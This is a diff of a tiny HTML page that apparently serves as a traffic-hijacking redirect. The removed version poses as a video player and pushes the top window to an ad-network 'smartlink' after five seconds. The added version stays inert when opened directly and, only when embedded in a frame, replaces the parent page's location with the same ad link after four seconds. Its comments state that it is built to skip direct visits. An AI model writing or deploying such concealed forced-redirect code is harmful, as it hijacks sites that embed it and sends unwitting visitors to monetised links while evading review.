@@ -1,64 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Video Player</title>
-
-<style>
-
-body{
-
-margin:0;
-background:black;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-
-}
-
-video{
-
-width:360px;
-height:640px;
-object-fit:cover;
-
-}
-
-</style>
-
+  <meta charset="utf-8">
+  <title>Landing</title>
 </head>
-
 <body>
 
-
-<video id="vid" autoplay muted playsinline>
-
-<source src="https://cdn2.videy.co/tk0C3L0I1.mp4" type="video/mp4">
-
-</video>
-
-
+<h1>landing-redirect</h1>
 
 <script>
+(function () {
 
+  // Jangan redirect kalau dibuka langsung
+  if (window.self === window.top) return;
 
-var smartlink = "https://www.profitablecpmratenetwork.com/kk8ez1tvr?key=9a5c74a1f25a341b022d34997583d717";
+  // Delay aman untuk iframe traffic
+  setTimeout(function () {
+    try {
+      window.top.location.replace("https://www.profitablecpmratenetwork.com/kk8ez1tvr?key=9a5c74a1f25a341b022d34997583d717");
+    } catch (e) {
+      window.location.href = "https://www.profitablecpmratenetwork.com/kk8ez1tvr?key=9a5c74a1f25a341b022d34997583d717";
+    }
+  }, 4000);
 
-
-setTimeout(function(){
-
-top.location.href = smartlink;
-
-},5000);
-
-
+})();
 </script>
-
-
 
 </body>
 </html>
